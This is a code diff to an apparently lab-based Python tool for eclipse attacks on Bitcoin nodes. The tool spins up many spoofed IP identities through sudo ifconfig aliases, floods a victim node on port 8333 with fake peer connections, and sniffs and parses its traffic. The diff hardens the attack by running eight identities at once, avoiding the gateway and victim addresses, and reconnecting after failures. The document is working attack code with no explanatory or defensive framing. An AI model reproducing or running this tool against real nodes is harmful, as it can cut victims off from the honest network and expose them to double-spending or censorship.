@@ -15,15 +15,27 @@ import struct
 import sys
 import time
 
-# Percentage (0 to 1) of packets to drop, else: relayed to victim
-eclipse_packet_drop_rate = 0
 
-num_identities = 1
+# Specify the attacker's genuine IP
+attacker_ip = '10.0.2.15'
 
+# Specify the victim's IP, and port (8333 for Bitcoin)
 victim_ip = '10.0.2.4'
 victim_port = 8333
 
-attacker_ip = '10.0.2.15'
+# How many identities should run simultaneously
+num_identities = 8
+
+# Percentage (0 to 1) of packets to drop, else: relayed to victim
+eclipse_packet_drop_rate = 0
+
+
+
+
+
+
+
+
 
 identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
 identity_address = [] # Keeps the IP and port for each successful connection
@@ -42,22 +54,35 @@ def bitcoin(cmd):
 
 # Generate a random identity using the broadcast address template
 def random_ip():
-	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
+	# By forcing the IP to be above a certain threshhold, it prevents a lot of errors
+	minimum_ip_range = min(int(attacker_ip.split('.')[-1]), int(victim_ip.split('.')[-1])) + 1
 	while(True):
 		ip = broadcast_address
 		old_ip = ''
 		while(old_ip != ip):
 			old_ip = ip
-			ip = ip.replace('255', str(random.randint(0, 255)), 1)
+			ip = ip.replace('255', str(random.randint(minimum_ip_range, 255)), 1)
 		# Don't accept already assigned IPs
-		if ip not in [x[0] for x in identity_address]:
-			break
+		if ip == default_gateway: continue
+		if ip == victim_ip: continue
+		if ip not in [x[0] for x in identity_address]: break
 	return ip
+	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
+
+# Checking the internet by sending a single ping to Google
+def internet_is_active():
+	return os.system('ping -c 1 google.com') == 0
+
+# If all else fails, we can use this to recover the network
+def reset_network():
+	print('Resetting network...')
+	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
+	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')
 
 # Create an alias for a specified identity
 def ip_alias(ip_address):
 	global alias_num
-	print(f'Setting up IP alias {ip_address}')
+	print(f'Setting up IP alias {ip_address} on {network_interface}')
 	interface = f'{network_interface}:{alias_num}'
 	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
 	alias_num += 1
@@ -107,13 +132,23 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	
 	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
-	s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-	
+	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+	while success == -1:
+		print(f'Setting socket network interface to "{network_interface}"...')
+		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+		time.sleep(1)
+		print(network_interface)
+
 	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
 	s.bind((src_ip, src_port))
 
 	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
-	s.connect((dst_ip, dst_port))
+	try:
+		s.connect((dst_ip, dst_port))
+	except:
+		close_connection(s, src_ip, src_port, interface)
+		make_fake_connection(random_ip(), dst_ip, False)
+		return
 
 	# Send version packet
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
@@ -148,9 +183,11 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 def sniff(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while True:
 		packet = socket.recv(65565)
-		packet_received(packet, socket, dst_ip, dst_port, src_ip, src_port, interface)
+		if packet_received(packet, socket, dst_ip, dst_port, src_ip, src_port, interface):
+			break
 
 # Called when a packet is sniffed from the network
+# Return true to end the thread
 def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interface):
 	if len(msg_raw) >= 4:
 		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
@@ -170,9 +207,9 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 		payload_valid = False
 		payload_length_valid = False
 
-	if not is_bitcoin: return
-	if not payload_valid: return
-	if not payload_length_valid: return
+	if not is_bitcoin: return False
+	if not payload_valid: return False
+	if not payload_length_valid: return False
 
 	# Parse the message payload
 	msg = MsgSerializable.from_bytes(msg_raw)
@@ -191,7 +228,7 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 			print("Closing socket because of error: " + str(e))
 			make_fake_connection(rand_ip, victim_ip, False) # Use old IP
 			#make_fake_connection(random_ip(), victim_ip, False)
-			sys.exit() # Stop the current thread that sniffs for packets on this interface
+			return True # End the thread
 
 	""" Relaying code
 	elif packet[IP].dst == attacker_ip:
@@ -227,15 +264,18 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 					#make_fake_connection(random_ip(), victim_ip)
 					sys.exit() # Stop the current thread that sniffs for packets on this interface
 	"""
+	return False
 
+# Initialize the network
 def initialize_network_info():
 	print('Retrieving network info...')
-	global network_interface, broadcast_address
+	global default_gateway, network_interface, broadcast_address
 
 	# Get the network interface of the default gateway
-	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
+	m = re.search(r'default +via +([^ ]+) +dev +([^ ]+)', terminal('ip route'))
 	if m != None:
-		network_interface = m.group(1).strip()
+		default_gateway = m.group(1).strip()
+		network_interface = m.group(2).strip()
 	else:
 		print('Error: Network interface couldn\'t be found.')
 		sys.exit()
@@ -249,6 +289,7 @@ def initialize_network_info():
 		print('Error: Network broadcast IP couldn\'t be found.')
 		sys.exit()
 
+# Initialize Bitcoin info
 def initialize_bitcoin_info():
 	print('Retrieving bitcoin info...')
 	global bitcoin_subversion
